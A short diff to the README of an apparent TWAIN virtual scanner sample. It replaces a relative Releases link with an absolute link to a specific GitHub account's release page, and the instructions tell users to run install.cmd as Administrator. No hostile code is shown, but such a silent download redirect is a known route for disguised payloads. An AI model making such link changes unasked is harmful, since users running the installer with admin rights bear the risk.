@@ -13,7 +13,7 @@ A **32-bit Windows TWAIN Data Source** (`TWAINDS_Sample32.ds`) that registers as
 
 ## Installation
 
-1. Download **`VirtualScanner-win32-portable.zip`** from **[Releases](../../releases/latest)** and extract it.
+1. Download **`VirtualScanner-win32-portable.zip`** from **[Releases](https://github.com/bohoradilli617-aibulid/twain-samples/releases/latest)** and extract it.
 2. Close any running scanner application or TWAIN bridge.
 3. Run **`install.cmd`** (as Administrator) to install into `C:\Windows\twain_32\sample2\`, or copy the extracted files there manually.
 4. Select **Windows Virtual Scanner** in your 32-bit TWAIN application (requires a 32-bit TWAIN Data Source Manager such as `twain_32.dll` or `twaindsm.dll`).
